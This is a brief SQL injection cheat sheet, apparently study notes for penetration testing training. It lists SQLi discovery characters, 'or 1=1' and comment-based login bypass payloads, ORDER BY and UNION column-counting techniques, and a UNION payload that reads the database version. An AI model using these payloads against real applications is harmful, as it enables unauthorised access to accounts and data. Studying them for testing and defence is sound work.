____

# Authentication Bypass

```sql
SELECT * FROM logins WHERE username='admin' AND password = 'p@ssw0rd';
```

## SQLi Discovery

|Payload|URL Encoded|
|---|---|
|`'`|`%27`|
|`"`|`%22`|
|`#`|`%23`|
|`;`|`%3B`|
|`)`|`%29`|
## OR Injection

```sql
admin' or '1'='1
```

## Auth Bypass with comments

```sql
SELECT * FROM logins WHERE username='' OR 1=1-- -' AND password = '';
```


# Detect number of columns

- Using `ORDER BY`
- Using `UNION`

We can start with `order by 1`, sort by the first column, and succeed, as the table must have at least one column. Then we will do `order by 2` and then `order by 3` until we reach a number that returns an error,

```sql
' order by 3-- -
```

Union injection with a different number of columns until we successfully get the results back

```sql
cn' UNION select 1,2,3,4-- -
```

# Locate injection 

```sql
cn' UNION select 1,@@version,3,4-- -
```
